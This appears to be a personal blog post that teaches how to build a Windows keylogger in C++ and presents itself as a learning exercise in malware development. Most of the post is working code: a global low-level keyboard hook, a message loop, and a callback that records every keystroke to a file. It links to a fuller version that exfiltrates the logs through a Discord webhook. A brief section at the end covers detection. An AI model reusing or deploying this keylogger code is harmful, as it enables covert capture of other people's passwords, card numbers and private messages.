+++
title = 'Writing a program that monitor keystrokes'
date = 2026-01-19
description = "Exploring and building keyloggers to understand how keystroke monitoring is implemented."
tags = ["malware"]
+++

# Intro
I’ve been messing around with malware development recently, and as part of my second warm-up project, I decided to write a simple keylogger. The goal here is to understand **how userland keyloggers work on Windows**, without getting overwhelmed by low-level internals.

# What is a keylogger?
A keylogger is a type of malware designed to **record keystrokes** in order to steal sensitive information such as passwords, credit card numbers, and private messages.

Keyloggers can exist at different levels:
- Hardware level (physical devices)
- Driver / kernel level
- Userland (user mode)

In this article, we’ll focus only on **userland keyloggers**, specifically how they work and how they’re commonly implemented.

Most keyloggers store captured keystrokes in a file, but it’s also possible to **exfiltrate them directly** without ever touching disk. For simplicity, we’ll stick to basic file-based logging.

# How does a userland keylogger work?
Before writing a keylogger, it helps to understand how keyboard input flows through Windows — at a high level.

Every key on a keyboard has a **scan code**, which is a hardware-level identifier sent when:
- the key is pressed
- the key is released

Windows processes keyboard input in layers:

## 1. Physical layer
The keyboard generates scan codes for key press and release events.

## 2. Driver layer
Keyboard drivers translate scan codes into **virtual key codes (VK_*)**.

## 3. Userland
Applications receive these events as **Windows messages**, such as:
- `WM_KEYDOWN`
- `WM_KEYUP`

For example, a virtual key code might look like this:

```cpp
case VK_NUMPAD0:
    key = "0";
    break;
```


# Implementation 
Let’s start with the implementation. Don’t worry, I’ll walk through it step by step. First, we’ll create a keyboard hook.

```cpp
int main()
{

  // 1. Create a keyboard hook
  HHOOK keyboardHook = SetWindowsHookEx (

      WH_KEYBOARD_LL,       // Type of hook procedure to be installed, I chose WH_KEYBOARD_LL to monitor low level keyboard inputs
                            // https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc

      LowLevelKeyboardProc, // 2. Pointer to the hook procedure ( Every keyboard events, windows will call LowLevelKeyboardProc() )
                            // 3. Note that the program itself doesn't call the function, Windows does whenever there's a keyboard event
      NULL,
      0

  );

  if ( keyboardHook == NULL )
  {
    std::cerr << "[ Failed to hook keyboard, exiting! ] \n";
    return 1;
  }

  // 4. Keep program alive and process windows internal messages
  // WH_KEYBOARD_LL require a GetMessage loop because their callbacks are queed as messages to the hooking thread's message queue
  MSG msg;

  while ( GetMessage ( &msg, NULL, 0, 0 ) )
  {
    TranslateMessage ( &msg );
    DispatchMessage ( &msg );
  }

  /*

  +------------------------------------------------------------------------------+
  | - SetWindowsHookEx     = Hey Windows, send me letters when someone types     |
  | - GetMessage loop      = You(Your program) checking your mailbox repeatedly  |
  | - LowLevelKeyboardProc = What you do when you receive a letter               |
  +------------------------------------------------------------------------------+

  */

  // It'll only unhook the keyboard once the GetMessage() loop stops (most likely closed by the user)
  UnhookWindowsHookEx ( keyboardHook );

  Logger::outputFile.close ();
  std::cout << "[ Stopped capturing] \n";

  return 0;
}
```

## Okay bro wait, what do you even mean by keyboard hook and what are these weird functions? 
A hook is simply a mechanism that allows applications to intercept system-wide events, such as mouse input, keystrokes, or window messages, before they reach their target application.

You can think of it like a checkpoint: events pass through it, and you get a chance to inspect them. In this case, we’re intercepting keyboard events so we can log them.

The important thing to understand is:
- You don’t call the hook function
- Windows calls it for you whenever a keyboard event occurs

Make sure to read the comments in the code and refer to the MSDN documentation, it helps a lot here.

# Handling and translating virtual keycodes 
Next, we need a way to translate virtual key codes into readable characters.

We’ll track modifier state first:
```cpp
namespace KeyboardState
{
  BOOL shift = false;
  BOOL capsLock = false;
}
```


Now we create a function that converts virtual key codes into characters:

```cpp
std::string hookCode ( DWORD code, BOOL capsLock, BOOL shift )
{
  std::string key;
  switch ( code ) // SWITCH ON INT
  {
  // Char keys for ASCI
  // No VM Def in header
  case 0x41:
    key = capsLock ? ( shift ? "a" : "A" ) : ( shift ? "A" : "a" );
    break;
  case 0x42:
    key = capsLock ? ( shift ? "b" : "B" ) : ( shift ? "B" : "b" );
    break;
  case 0x43:
    key = capsLock ? ( shift ? "c" : "C" ) : ( shift ? "C" : "c" );
    break;

 // Keys
  case VK_NUMLOCK:
    key = " [NUM-LOCK] ";
    break;
  case VK_SCROLL:
    key = " [SCROLL-LOCK] ";
    break;
 default:
    key = "[UNK-KEY]";
    break;
  }

  return key;
}
```


If you’re wondering what these **0x41**, **0x42**, etc. values are:
they’re virtual key codes. For example, according to the MSDN documentation, **0x41** corresponds to the **A** key.

We’re simply translating these numeric values into readable characters so the logs make sense.

# Creating the hook callback
Now let’s implement the function that Windows calls whenever a keyboard event occurs.

```cpp
LRESULT CALLBACK LowLevelKeyboardProc ( int code, WPARAM wParam, LPARAM lParam )
{
  /*

    LRESULT CALLBACK LowLevelKeyboardProc
    (

    int code,        // Status: HC_ACTION, or negative
    WPARAM wParam,   // Event type: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, etc.
    LPARAM lParam    // Pointer to KBDLLHOOKSTRUCT (detailed keyboard info)

    )

    https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc

*/

  SHORT getcapsLockStatus = GetKeyState ( VK_CAPITAL );

  if ( ( getcapsLockStatus & 0x0001 ) != 0 )
  {
    // Check if the low-order bit is set
    KeyboardState::capsLock = true;
  }

  else
  {
    KeyboardState::capsLock = false;
  }

  // Create a pointer of KBDLLHOOKSTRUCT that contains keyboard event details (vkCode, scanCode, flags, etc.)
  KBDLLHOOKSTRUCT *keyboardData = reinterpret_cast<KBDLLHOOKSTRUCT *> ( lParam );

  // Is this a valid keyboard event that we can process? if yes then proceed
  if ( code == HC_ACTION )
  {
    // Check if shift is pressed

    /*

     After creating a pointer to KBDLLHOOKSTRUCT we can now check virtual keycodes like this
     p->vkCode

    typedef struct tagKBDLLHOOKSTRUCT {
      DWORD     vkCode;
      DWORD     scanCode;
      DWORD     flags;
      DWORD     time;
      ULONG_PTR dwExtraInfo;
    } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

     */

    // Checks if Shift is pressed1
    if ( keyboardData->vkCode == VK_LSHIFT || keyboardData->vkCode == VK_RSHIFT )
    {
      if ( wParam == WM_KEYDOWN )
      {
        KeyboardState::shift = true;
      }

      else
      {
        KeyboardState::shift = false;
      }
    }

    // Checks if a key is pressed down
    if ( wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN )
    {
      if ( keyboardData->vkCode )
      {

        // Clear the contents of the buffer
        Logger::output.str ( "" );

        // Store the keylogs in buffer
        Logger::output << hookCode ( keyboardData->vkCode, KeyboardState::capsLock, KeyboardState::shift );

        // Store the buffer data inside outputFile
        Logger::outputFile << Logger::output.str ();
        Logger::outputFile.flush ();

        // Print the contnets of outputFile
        std::cout << Logger::output.str ();
      }

     }
    }
  }

  // Pass the event to the next hook to avoid breaking input
  return CallNextHookEx ( NULL, code, wParam, lParam );
}
```

At this point, we have all the core components in place: a keyboard hook to intercept input, a hook callback that Windows invokes on each keyboard event, a keycode translation system to convert virtual key codes into readable characters, and a message loop to keep the process alive. Together, these pieces are enough to build a fully functional userland keylogger. The full version which also includes file exfiltration and sending logs via a Discord webhook is available on my [GitHub](https://github.com/0xgrit/Junbi/tree/main/Keylogger) feel free to reference it. 

![poc](https://github.com/user-attachments/assets/6a3cf9b6-ca34-4aab-b1a9-f4c78d47914b)

# Now, how do we detect this? 
Processing **WM_KEYDOWN** in a background process with no visible UI can already be a red flag, especially if the program has no real reason to care about keyboard input. On its own, **WM_KEYDOWN** is normal and used everywhere, but it becomes suspicious when a process keeps handling these messages while not in focus, having no active window, and offering no user-facing functionality. When this is paired with a global low-level keyboard hook **(WH_KEYBOARD_LL)**, a hook that stays installed for a long time, and keystrokes being stored or buffered somewhere, it starts to look much more like keylogging behavior than a legitimate app.

that's all bye, wibbly woobly wobbly woo! 67 gyat sigma 






